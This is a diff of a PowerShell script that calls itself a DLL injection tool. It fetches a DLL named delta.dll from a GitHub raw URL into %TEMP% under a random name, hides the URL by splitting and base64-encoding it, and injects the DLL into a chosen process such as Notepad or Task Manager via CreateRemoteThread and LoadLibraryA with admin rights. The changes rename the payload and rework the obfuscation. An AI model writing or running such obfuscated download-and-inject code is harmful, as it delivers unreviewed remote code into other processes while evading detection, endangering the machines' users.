@@ -76,27 +76,27 @@ catch {
     Write-Host "[!] Warning: Could not fully clear temp (files might be in use). Continuing..." -ForegroundColor Yellow
 }
 
-# === 2. Download DLL to %TEMP% with Random Name ===
+# === 2. Download delta.dll to %TEMP% ===
 $randomGuid = [System.Guid]::NewGuid().ToString()
 $dllFileName = "$randomGuid.dll"
 $dllPath = Join-Path $env:TEMP $dllFileName
 
-# --- Obfuscated URL (Changed to delta.dll) ---
-$urlPart1 = "https://raw."
-$urlPart2 = "githubusercon"
-$urlPart3 = "tent.com/nova"
-$urlPart4 = "xstorex/delta"
-$urlPart5 = "/refs/heads/ma"
-$urlPart6 = "in/delta.dll"
+# --- Obfuscated URL for delta.dll ---
+$baseUrl = "https://raw.githubusercontent.com/novaxstorex/delta/main/delta.dll"
 
-$encodedUrl = @(
-    [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($urlPart1)),
-    [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($urlPart2)),
-    [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($urlPart3)),
-    [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($urlPart4)),
-    [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($urlPart5)),
-    [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($urlPart6))
+# Split and encode URL parts for obfuscation
+$urlParts = @(
+    "https://raw.g",
+    "ithubusercon",
+    "tent.com/nov",
+    "axstorex/de",
+    "lta/main/de",
+    "lta.dll"
 )
+
+$encodedUrl = $urlParts | ForEach-Object {
+    [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($_))
+}
 
 $decodedParts = $encodedUrl | ForEach-Object {
     [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($_))
@@ -104,7 +104,7 @@ $decodedParts = $encodedUrl | ForEach-Object {
 $dllUrl = $decodedParts -join ""
 
 try {
-    Write-Host "[+] Downloading DLL..." -ForegroundColor Cyan
+    Write-Host "[+] Downloading delta.dll..." -ForegroundColor Cyan
     Write-Host "[+] Saving to: $dllPath" -ForegroundColor Cyan
     
     $webClient = New-Object System.Net.WebClient
@@ -161,10 +161,10 @@ catch {
 # === Process Selection Menu (Interactive) ===
 Clear-Host
 Write-Host "========================================" -ForegroundColor Cyan
-Write-Host "    DLL INJECTION TOOL - SELECT TARGET" -ForegroundColor Yellow
+Write-Host "    DELTA DLL INJECTION TOOL" -ForegroundColor Yellow
 Write-Host "========================================" -ForegroundColor Cyan
 Write-Host ""
-Write-Host "Select target process:" -ForegroundColor White
+Write-Host "Select target process for injection:" -ForegroundColor White
 Write-Host ""
 Write-Host "  [1] Notepad" -ForegroundColor Green
 Write-Host "  [2] Task Manager (Taskmgr)" -ForegroundColor Green
@@ -314,7 +314,7 @@ do {
         Read-Host
         Clear-Host
         Write-Host "========================================" -ForegroundColor Cyan
-        Write-Host "    DLL INJECTION TOOL - SELECT TARGET" -ForegroundColor Yellow
+        Write-Host "    DELTA DLL INJECTION TOOL" -ForegroundColor Yellow
         Write-Host "========================================" -ForegroundColor Cyan
         Write-Host ""
         Write-Host "Select target process:" -ForegroundColor White
@@ -348,6 +348,7 @@ $pid1 = $proc.Id
 Write-Host ""
 Write-Host "========================================" -ForegroundColor Green
 Write-Host "[+] Target: $targetProcess (PID: $pid1) [Admin Context]" -ForegroundColor Green
+Write-Host "[+] Injecting: delta.dll" -ForegroundColor Green
 Write-Host "========================================" -ForegroundColor Green
 Write-Host ""
 
@@ -414,7 +415,7 @@ try {
     $loadLibAddr = LookupFunc kernel32.dll LoadLibraryA
     Write-Host "[+] LoadLibraryA Address: $loadLibAddr" -ForegroundColor Green
     
-    Write-Host "[+] Creating remote thread to load DLL..." -ForegroundColor Cyan
+    Write-Host "[+] Creating remote thread to load delta.dll..." -ForegroundColor Cyan
     $hThread = $CreateRemoteThreadDelegate.Invoke($hProcess, [IntPtr]::Zero, 0, $loadLibAddr, $addr, 0, [IntPtr]::Zero)
     
     if ($hThread -ne [IntPtr]::Zero) {
@@ -422,7 +423,8 @@ try {
         Write-Host "========================================" -ForegroundColor Green
         Write-Host "[✓] INJECTION SUCCESSFUL!" -ForegroundColor Green
         Write-Host "[✓] Thread Handle: $hThread" -ForegroundColor Green
-        Write-Host "[✓] DLL loaded into $targetProcess (PID: $pid1)" -ForegroundColor Green
+        Write-Host "[✓] delta.dll loaded into $targetProcess (PID: $pid1)" -ForegroundColor Green
+        Write-Host "[✓] Delta DLL is now running in target process" -ForegroundColor Green
         Write-Host "========================================" -ForegroundColor Green
     } else {
         Write-Host ""
